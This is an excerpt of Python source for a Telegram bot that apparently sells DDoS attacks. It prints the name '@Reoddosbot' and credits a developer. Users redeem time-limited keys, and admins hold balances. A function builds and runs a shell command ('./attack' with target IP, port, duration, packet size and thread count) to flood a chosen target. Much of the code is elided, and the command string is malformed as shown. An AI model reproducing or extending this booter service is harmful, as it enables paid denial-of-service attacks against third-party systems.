...
ADMIN_IDS = [6442310977, 6442310977]
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        command = f"./attack{target_ip} {target_port} {duration} {packet_size} {thread_count}"
...
def process_attack_command(message, chat_id):
    try:
        ...
        if len(args) != 3:
            bot.send_message(chat_id, "*Try Again Please*", parse_mode='Markdown')
            return
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By ᚛ @Reo_47 ᚜"  
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By ᚛ @Reo_47 ᚜\n\n"
            f"Admin Commands:\n"
        ...
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! Developed By ᚛ @Reo_47 ᚜\n\n"
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @Reo_47 ᚜*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @Reo_47 ᚜.*", parse_mode='Markdown')
        return
...
def my_account(message):
    ...
    if is_super_admin(user_id):
        ...
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @Reo_47 ᚜."

    bot.send_message(message.chat.id, account_info)

if __name__ == '__main__':
    print("Bot is running...")
    print("@Reoddosbot running...")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
